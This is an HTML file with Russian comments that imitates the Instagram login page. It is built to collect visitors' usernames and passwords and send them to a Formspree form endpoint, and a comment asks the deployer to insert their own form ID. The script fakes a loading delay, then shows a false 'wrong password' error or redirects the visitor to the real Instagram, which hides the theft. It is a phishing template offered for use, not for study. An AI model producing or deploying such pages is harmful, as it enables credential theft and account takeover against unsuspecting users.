<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #fafafa;
            --border-color: #dbdbdb;
            --text-color: #262626;
            --button-color: #0095f6;
            --button-hover: #1877f2;
            --link-color: #00376b;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: var(--text-color);
        }

        .login-container {
            background-color: white;
            border: 1px solid var(--border-color);
            padding: 20px 40px;
            width: 100%;
            max-width: 350px;
            text-align: center;
            box-sizing: border-box;
        }

        /* Логотип Instagram */
        .logo {
            font-family: 'Billabong', cursive; /* Fallback */
            font-size: 48px;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: normal;
            letter-spacing: 1px;
        }
        
        /* Если Billabong не загрузится, используем похожий стиль */
        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
        .logo {
            font-family: 'Grand Hotel', cursive;
        }

        input {
            width: 100%;
            padding: 12px 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 10px;
            font-size: 12px;
            box-sizing: border-box;
            outline: none;
        }

        input:focus {
            border: 1px solid #a8a8a8;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: var(--button-color);
            border: none;
            border-radius: 8px; /* Более современные скругления */
            color: white;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }

        button:hover {
            background-color: var(--button-hover);
        }

        button:disabled {
            background-color: #aecae8;
            cursor: default;
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
        }

        .separator::before, .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: var(--border-color);
        }

        .separator span {
            padding: 0 10px;
        }

        a {
            color: var(--link-color);
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }

        .footer-links {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        /* Анимация загрузки */
        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 2s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">Instagram</div>
    
    <!-- ВСТАВЬ СВОЙ ID ФОРМСПИИР ЗДЕСЬ -->
    <form action="https://formspree.io/f/ХХХХХХХ" method="POST" id="loginForm">
        <input type="text" name="username" placeholder="Телефон, имя пользователя или эл. адрес" required autocomplete="off">
        <input type="password" name="password" placeholder="Пароль" required>
        
        <button type="submit" id="submitBtn">Войти</button>
        
        <div class="loader" id="loader"></div>
    </form>

    <div class="separator"><span>ИЛИ</span></div>
    
    <a href="#">Забыли учётную запись?</a>
    <a href="#" style="margin-top: 5px;">Зарегистрироваться</a>
    
    <div class="footer-links">
        <p>Получите приложение.</p>
        <div style="margin-top: 10px;">
            <i class="fab fa-apple" style="font-size: 24px; margin: 0 5px;"></i>
            <i class="fab fa-google-play" style="font-size: 24px; margin: 0 5px;"></i>
        </div>
    </div>
</div>

<script>
    const form = document.getElementById('loginForm');
    const btn = document.getElementById('submitBtn');
    const loader = document.getElementById('loader');

    form.addEventListener('submit', function(e) {
        // Не даем странице сразу перезагрузиться
        e.preventDefault(); 
        
        btn.disabled = true;
        btn.innerText = "Вход...";
        loader.style.display = "block";

        // Имитация задержки сети (как в реальном инсте)
        setTimeout(() => {
            // Отправляем данные через Formspree (если настроен)
            // Если Formspree не настроен, просто показываем ошибку "Неверный пароль"
            
            // Для демонстрации: если ты не вставил свой ID, мы просто покажем "ошибку"
            if(document.querySelector('form').action.includes('ХХХХХХХ')) {
                 alert("Неверный пароль или имя пользователя.");
                 btn.disabled = false;
                 btn.innerText = "Войти";
                 loader.style.display = "none";
            } else {
                // Если Formspree настроен правильно, он сам перенаправит пользователя
                // Но мы можем показать фейковую страницу успеха
                window.location.href = "https://www.instagram.com/"; 
            }
        }, 1500);
    });
</script>

</body>
</html>
